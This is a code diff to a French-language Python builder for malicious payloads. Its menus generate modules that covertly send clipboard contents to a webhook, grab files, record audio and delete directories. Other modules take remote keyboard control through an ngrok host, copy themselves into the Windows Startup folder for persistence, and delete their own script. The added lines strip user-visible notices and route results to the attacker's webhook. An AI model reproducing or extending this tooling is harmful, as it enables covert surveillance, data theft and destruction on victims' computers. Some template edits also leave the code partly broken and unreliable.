@@ -116,6 +116,7 @@ Tapez : valider pour valider
         global code
         interval = choix["Intervalle de capture"] or 2
         code += f"""
+WEHOOK_URL = {repr(WEBHOOK)}
 import os
 os.system("pip install clipboard")
 import clipboard
@@ -123,18 +124,16 @@ import time
 
 def clipboard_monitor():
     old = clipboard.paste()
-    print("Surveillance du presse-papier lancée...\\n")
 
     while True:
         time.sleep({interval})
-        current_time = time.strftime('%H:%M')
 
         mtn = clipboard.paste()
 
         if old != mtn:
             old = mtn
 
-        requests.post(WEBHOOK_URL, json={{"content": f"Contenu du presse-papier à {{current_time}} : {{mtn}}"}})
+        requests.post(WEBHOOK_URL, json={{"content": f"Contenu du presse-papier à : {{mtn}}"}})
         
 
 """
@@ -257,9 +256,10 @@ import time
 import shutil
 
 
-CHEMIN    = {chemin}
-RECURSIF  = {recursive}
-DELAI     = {delai}
+chemin    = {chemin}
+recursive  = {recursive}
+delai     = {delai}
+WEBHOOK_URL = {repr(WEBHOOK)}
 
 
 def remove_directory():
@@ -287,14 +287,14 @@ def remove_directory():
             # fonctionne uniquement si le dossier est VIDE
             os.rmdir(CHEMIN)
 
-        requests.post(WEBHOOK_URL, json={"content": f"Répertoire supprimé "})
+        requests.post(WEBHOOK_URL, json={{"content": f"Répertoire supprimé "}})
 
     except OSError as e:
         print(f'Erreur lors de la suppression : ')
         pass
 
         if not RECURSIF:
-            print("Astuce : activez la suppression récursive si le dossier n'est pas vide.")
+            requests.post(WEBHOOK_URL, json={{"content": f"Répertoire supprimé : {{chemin}}"}})
             """
 
     while True:
@@ -395,18 +395,18 @@ import os
 import time
 
 NOM_SCRIPT = {repr(nom)}
-DELAI = {delai}
-RECURSIF = {recursif}
+DELAI_RMSCRIPT = {delai}
+RECURSIF_RMSCRIPT = {recursif}
 
 def remove_script():
 
-    if DELAI > 0:
-        time.sleep(DELAI)
+    if DELAI_RMSCRIPT > 0:
+        time.sleep(DELAI_RMSCRIPT)
 
     base = os.getcwd()
     found = False
 
-    if RECURSIF:
+    if RECURSIF_RMSCRIPT:
         for root, dirs, files in os.walk(base):
             if NOM_SCRIPT in files:
                 path = os.path.join(root, NOM_SCRIPT)
@@ -537,7 +537,7 @@ exit pour quitter
 import os
 import time
 
-COMMANDE = {repr(cmd)}
+COMMANDE_CMD = {repr(cmd)}
 DEMARRAGE = {demarrage}
 BOUCLE = {boucle}
 DELAI = {delai}
@@ -1031,7 +1031,7 @@ def voicerecorder_module():
 {Fore.GREEN}
 set <num>   pour configurer
 show        pour afficher la config
-create      pour générer
+valider     pour générer
 exit        pour revenir
 {Style.RESET_ALL}
 """)
@@ -1040,6 +1040,7 @@ exit        pour revenir
     # OPTIONS
     # -------------------------
     def set_duree():
+        clear()
         val = input("Entrez la durée de l'enregistrement (en secondes) : ").strip()
         if val.isdigit():
             choix["Durée de l'enregistrement"] = int(val)
@@ -1056,6 +1057,7 @@ exit        pour revenir
     # PAYLOAD
     # -------------------------
     def create_payload():
+        global code
         clear()
         print("=== Payload Voice Recorder Généré ===\n")
         duree = choix["Durée de l'enregistrement"]
@@ -1118,8 +1120,9 @@ if __name__ == "__main__":
             for k, v in choix.items():
                 print(f"{k}: {v}")
             input("\nAppuyez sur Entrée...")
-        elif cmd == "create":
+        elif cmd == "valider":
             create_payload()
+            break
         else:
             print("Commande invalide.")
             input("Appuyez sur Entrée...")
@@ -1142,7 +1145,7 @@ def wallpaper_module():
               {Fore.GREEN}
 Tapez : set <num> pour configurer
 Tapez : show pour afficher la config
-Tapez : create pour générer
+Tapez : valider pour générer
 Tapez : exit pour quitter{Style.RESET_ALL}
           """)
 
@@ -1239,7 +1242,7 @@ def directory_listing_module():
 {Fore.GREEN}
 Tapez : set <num> pour configurer
 Tapez : show pour afficher la config
-Tapez : create pour générer
+Tapez : valider pour générer
 Tapez : exit pour quitter
             {Style.RESET_ALL}
                   """)
@@ -1388,7 +1391,7 @@ def filegrab():
 {Fore.GREEN}
 Tapez : set <num> pour configurer
 Tapez : show pour afficher la config
-Tapez : create pour générer
+Tapez : valider pour générer
 Tapez : exit pour quitter
             {Style.RESET_ALL}
                   """)
@@ -1485,6 +1488,25 @@ def lancer_filegrab():
     print(f"Envoi sous le nom : {{nom_final}}")
 
 """
+        
+    while True:
+        affichage_filegrab()
+        cmd = input(">> ").strip().lower()
+
+        if cmd == "exit":
+            break
+
+        elif cmd == "valider":
+            create_payload()
+            break
+
+        elif cmd.startswith("set "):
+            num = cmd.split()[1]
+            if num in ["1", "2", "3"]:
+                options[int(num)-1][1]()
+            else:
+                print("Option invalide")
+                time.sleep(1)
 
 def keybcontrol():
     global code, WEBHOOK
@@ -1501,14 +1523,14 @@ site = "https://nonreversing-dulcie-dashingly.ngrok-free.dev/"
 test = requests.get(site, verify=False)
 
 
-mapping = {
+mapping = {{
     "ctrl": "ctrl",
     "maj": "shift",
     "shift": "shift",
     "alt": "alt",
     "win": "win",
     "enter": "enter"
-}
+}}
 
 # touches simples reconnues
 touches_simples = ["ctrl", "shift", "alt", "win", "enter", "fn", "delete"]
@@ -1547,7 +1569,7 @@ while True:
             touches = ligne.split()
             touches = [mapping.get(t, t) for t in touches]
             pyautogui.hotkey(*touches)
-            requests.post(WEBHOOK_URL, json={"content": "touches executé : " + " + ".join(touches)}, verify=False)
+            requests.post(WEBHOOK_URL, json={{"content": "touches executé : " + " + ".join(touches)}}, verify=False)
 
         elif ligne in touches_simples:
             pyautogui.press(mapping.get(ligne, ligne))
@@ -1587,7 +1609,7 @@ def openurl():
 {Fore.GREEN}
 Tapez : set <num> pour configurer
 Tapez : show pour afficher la config
-Tapez : create pour générer
+Tapez : valider pour générer
 Tapez : exit pour quitter
             {Style.RESET_ALL}
 
@@ -1661,7 +1683,9 @@ DELAY = {choix["Délai"]}
 
 def open_url():
 
-    if STARTUP:
+    """
+        if choix["Démarrage"] == True:
+            code += """
         if sys.platform == "win32":
             startup = os.path.join(
                 os.getenv("APPDATA"),
@@ -1671,6 +1695,8 @@ def open_url():
                 "Programs",
                 "Startup"
             )
+            """
+            code += """
             path = os.path.abspath(sys.argv[0])
             dest = os.path.join(startup, "open_url_payload.py")
 
@@ -1882,3 +1908,4 @@ Tapez : exit pour quitter
             print(Fore.GREEN + "Payload généré dans payload/payload_created/final_payload.py" + Style.RESET_ALL)
             break
 
+multipayload_module()
